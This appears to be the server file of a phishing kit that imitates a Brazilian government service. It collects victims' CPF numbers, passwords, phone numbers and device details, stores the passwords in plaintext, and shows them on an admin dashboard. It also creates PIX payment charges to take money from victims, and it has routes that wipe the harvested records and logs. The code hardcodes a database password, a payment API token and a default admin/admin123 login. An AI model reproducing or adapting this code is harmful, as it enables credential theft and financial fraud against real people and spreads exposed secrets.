const express = require('express');
const cors = require('cors');
const { Pool } = require('pg');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

const app = express();

app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; font-src * data:; img-src * data:; connect-src *; frame-src *;");
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    next();
});

app.use(cors());
app.use(express.json());
app.use(cookieParser());
app.use(express.static('.'));

const pool = new Pool({
    connectionString: 'postgresql://nuitbanker:atgNCCq9ga24H6CJH4bTapscom71pLq1@dpg-d896ke4m0tmc738ve890-a/meu_banco_novo',
    ssl: { rejectUnauthorized: false }
});

pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(14) UNIQUE,
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        telefone VARCHAR(20),
        data_cpf TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        data_senha TIMESTAMP,
        status VARCHAR(20)
    )
`).catch(e => console.log('Tabela users ok'));

pool.query(`
    ALTER TABLE users ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
`).catch(e => console.log('Coluna telefone ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        tipo VARCHAR(30),
        cpf VARCHAR(14),
        senha TEXT,
        ip TEXT,
        dispositivo TEXT,
        navegador TEXT,
        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
`).catch(e => console.log('Tabela logs ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE,
        senha_hash VARCHAR(255)
    )
`).catch(e => console.log('Tabela admin ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE,
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        valor DECIMAL(10,2),
        status VARCHAR(20) DEFAULT 'pending',
        data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        data_pagamento TIMESTAMP
    )
`).catch(e => console.log('Tabela payments ok'));

pool.query(`
    ALTER TABLE payments ADD COLUMN IF NOT EXISTS telefone VARCHAR(20)
`).catch(e => console.log('Coluna telefone payments ok'));

pool.query(`
    CREATE TABLE IF NOT EXISTS admin_attempts (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        tentativa TEXT,
        data TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
`).catch(e => console.log('Tabela admin_attempts ok'));

(async () => {
    try {
        const adminExists = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (adminExists.rows.length === 0) {
            const hash = await bcrypt.hash('admin123', 10);
            await pool.query('INSERT INTO admin_users (username, senha_hash) VALUES ($1, $2)', ['admin', hash]);
            console.log('Admin criado: admin / admin123');
        }
    } catch(e) {}
})();

const JWT_SECRET = 'gov_secret_2024';

function verificarAdminToken(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) {
        return res.status(401).json({ error: 'Token nao fornecido' });
    }
    
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        if (decoded.username !== 'admin') {
            return res.status(403).json({ error: 'Acesso negado' });
        }
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Token invalido ou expirado' });
    }
}

function getClientIP(req) {
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress ||
               req.ip;
    return ip ? ip.replace(/^::ffff:/, '') : 'IP nao identificado';
}

app.post('/api/cpf', async (req, res) => {
    const { cpf, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `INSERT INTO users (cpf, ip, dispositivo, navegador, data_cpf, status, telefone) 
             VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP, $5, $6)
             ON CONFLICT (cpf) DO UPDATE SET ip = $2, dispositivo = $3, navegador = $4, telefone = $6`,
            [cpf, ip, dispositivo, navegador, 'aguardando_senha', telefone]
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/login', async (req, res) => {
    const { cpf, password, ip, dispositivo, navegador, telefone } = req.body;
    try {
        await pool.query(
            `UPDATE users SET senha = $1, ip_senha = $2, dispositivo_senha = $3, navegador_senha = $4, data_senha = CURRENT_TIMESTAMP, status = $5, telefone = COALESCE(telefone, $6)
             WHERE cpf = $7`,
            [password, ip, dispositivo, navegador, 'completo', telefone, cpf]
        );
        await pool.query(
            'INSERT INTO logs (tipo, cpf, senha, ip, dispositivo, navegador) VALUES ($1, $2, $3, $4, $5, $6)',
            ['senha_inserida', cpf, password, ip, dispositivo, navegador]
        );
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    const ip = getClientIP(req);
    
    const tentativa = `Login para usuario: ${username}`;
    await pool.query(
        'INSERT INTO admin_attempts (ip, tentativa) VALUES ($1, $2)',
        [ip, tentativa]
    ).catch(e => console.log('Erro ao registrar tentativa:', e));
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
        if (result.rows.length === 0) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
        if (!valid) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
        res.cookie('admin_token', token, { httpOnly: true, maxAge: 24 * 60 * 60 * 1000 });
        res.json({ success: true, token });
        
    } catch (error) {
        console.error('Erro no login admin:', error);
        res.status(500).json({ error: 'Erro interno' });
    }
});

app.post('/api/admin/logout', (req, res) => {
    res.clearCookie('admin_token');
    res.json({ success: true });
});

app.get('/api/admin/stats', verificarAdminToken, async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) FROM users');
        const comSenha = await pool.query("SELECT COUNT(*) FROM users WHERE senha IS NOT NULL");
        const totalLogs = await pool.query('SELECT COUNT(*) FROM logs');
        res.json({ stats: { 
            total_users: parseInt(totalUsers.rows[0].count),
            com_senha: parseInt(comSenha.rows[0].count),
            total_logs: parseInt(totalLogs.rows[0].count)
        }});
    } catch (error) {
        res.json({ stats: { total_users: 0, com_senha: 0, total_logs: 0 } });
    }
});

app.get('/api/admin/users', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT cpf, senha, ip, dispositivo, navegador, data_cpf, data_senha, telefone FROM users ORDER BY data_cpf DESC');
        res.json({ users: result.rows });
    } catch (error) {
        res.json({ users: [] });
    }
});

app.get('/api/admin/logs', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT tipo, cpf, senha, ip, dispositivo, navegador, data FROM logs ORDER BY data DESC LIMIT 200');
        res.json({ logs: result.rows });
    } catch (error) {
        res.json({ logs: [] });
    }
});

app.get('/api/admin/payments', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM payments ORDER BY id DESC');
        res.json({ payments: result.rows });
    } catch (error) {
        res.json({ payments: [] });
    }
});

app.get('/api/admin/tentativas', verificarAdminToken, async (req, res) => {
    try {
        const result = await pool.query('SELECT * FROM admin_attempts ORDER BY data DESC LIMIT 100');
        res.json({ tentativas: result.rows });
    } catch (error) {
        res.json({ tentativas: [] });
    }
});

app.delete('/api/admin/delete/:cpf', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM users WHERE cpf = $1', [req.params.cpf]);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

app.post('/api/admin/clear', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM users');
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        res.json({ success: true });
    }
});

// Limpar logs
app.post('/api/admin/clear-logs', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM logs');
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao limpar logs:', error);
        res.json({ success: false });
    }
});

// Limpar tentativas de acesso
app.post('/api/admin/clear-attempts', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM admin_attempts');
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao limpar tentativas:', error);
        res.json({ success: false });
    }
});

// Limpar pagamentos
app.post('/api/admin/clear-payments', verificarAdminToken, async (req, res) => {
    try {
        await pool.query('DELETE FROM payments');
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao limpar pagamentos:', error);
        res.json({ success: false });
    }
});

app.post('/api/admin/change-password', verificarAdminToken, async (req, res) => {
    const { senha_antiga, nova_senha } = req.body;
    
    if (!senha_antiga || !nova_senha || nova_senha.length < 6) {
        return res.status(400).json({ error: 'Senha antiga obrigatoria e nova senha deve ter no minimo 6 caracteres' });
    }
    
    try {
        const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
        if (result.rows.length === 0) {
            return res.status(404).json({ error: 'Admin nao encontrado' });
        }
        
        const senhaValida = await bcrypt.compare(senha_antiga, result.rows[0].senha_hash);
        if (!senhaValida) {
            return res.status(401).json({ error: 'Senha atual incorreta' });
        }
        
        const hash = await bcrypt.hash(nova_senha, 10);
        await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao alterar senha:', error);
        res.status(500).json({ error: 'Erro interno do servidor' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

app.get('/password.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'password.html'));
});

const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';

function generateTransactionId() {
    return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
}

app.post('/api/save-payment', async (req, res) => {
    const { transaction_id, cpf, valor, telefone } = req.body;
    try {
        await pool.query(
            'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (transaction_id) DO NOTHING',
            [transaction_id, cpf, valor, 'pending', telefone]
        );
        res.json({ success: true });
    } catch (error) {
        console.error('Erro ao salvar pagamento:', error);
        res.json({ success: false });
    }
});

app.get('/api/check-payment/:transaction_id', async (req, res) => {
    const { transaction_id } = req.params;
    try {
        const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [transaction_id]);
        if (result.rows.length > 0) {
            res.json({ status: result.rows[0].status });
        } else {
            res.json({ status: 'not_found' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Erro ao verificar pagamento' });
    }
});

app.post('/api/create-payment', async (req, res) => {
    const { amount, customer_name, customer_email, customer_cpf, customer_phone } = req.body;

    if (!amount || amount <= 0) {
        return res.status(400).json({ error: 'Valor invalido' });
    }

    // 🔥 ATUALIZAR TELEFONE NA TABELA USERS 🔥
    if (customer_phone && customer_cpf) {
        try {
            await pool.query(
                'UPDATE users SET telefone = $1 WHERE cpf = $2',
                [customer_phone, customer_cpf]
            );
            console.log(`📞 Telefone ${customer_phone} atualizado para o CPF ${customer_cpf}`);
        } catch(e) {
            console.log('Erro ao atualizar telefone:', e);
        }
    }

    const amountCents = Math.round(parseFloat(amount) * 100);

    const payload = {
        amount: amountCents,
        offer_hash: PLUMIFY_PRODUCT_HASH,
        payment_method: 'pix',
        customer: {
            name: customer_name || 'PAGAMENTO UNICO',
            email: customer_email || 'SAC@com.br',
            phone_number: customer_phone || '21973059827',
            document: customer_cpf || '07068093868',
            street_name: 'Rua Teste',
            number: '123',
            neighborhood: 'Centro',
            city: 'Sao Paulo',
            state: 'SP',
            zip_code: '01001000'
        },
        cart: [{
            product_hash: PLUMIFY_PRODUCT_HASH,
            title: 'PAGAMENTO UNICO',
            price: amountCents,
            quantity: 1,
            operation_type: 1,
            tangible: false
        }],
        expire_in_days: 3,
        transaction_origin: 'api',
        postback_url: 'https://gov-clone-81e8.onrender.com/api/webhook/pagamento'
    };

    console.log('Enviando para Plumify:', JSON.stringify(payload, null, 2));

    try {
        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions?api_token=${PLUMIFY_API_TOKEN}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        const data = await response.json();
        console.log('Resposta Plumify:', data);

        if (data.pix && data.pix.pix_qr_code) {
            await pool.query(
                'INSERT INTO payments (transaction_id, cpf, valor, status, telefone) VALUES ($1, $2, $3, $4, $5) ON CONFLICT (transaction_id) DO NOTHING',
                [data.hash, customer_cpf, amount, 'pending', customer_phone]
            ).catch(e => console.log('Erro ao salvar:', e));

            res.json({
                success: true,
                payment: {
                    pix_code: data.pix.pix_qr_code,
                    pix_qrcode: data.pix.pix_qr_code,
                    expires_at: data.expires_at,
                    id: data.hash,
                    status: data.payment_status
                }
            });
        } else {
            res.json({
                success: false,
                error: data.message || 'Erro ao gerar PIX',
                details: data
            });
        }

    } catch (error) {
        console.error('Erro Plumify:', error.message);
        res.status(500).json({
            error: 'Erro ao gerar pagamento. Tente novamente.'
        });
    }
});

app.post('/api/webhook/pagamento', async (req, res) => {
    const { hash, status, amount, transaction } = req.body;
    
    console.log(`Webhook recebido: Transacao ${hash || transaction} - Status: ${status}`);
    
    if (status === 'paid') {
        try {
            await pool.query(
                'UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2',
                ['paid', hash || transaction]
            );
            console.log(`Pagamento confirmado: ${hash || transaction}`);
        } catch (error) {
            console.error('Erro ao processar webhook:', error);
        }
    }
    
    res.json({ received: true });
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`nuitbanker v2!`);
});
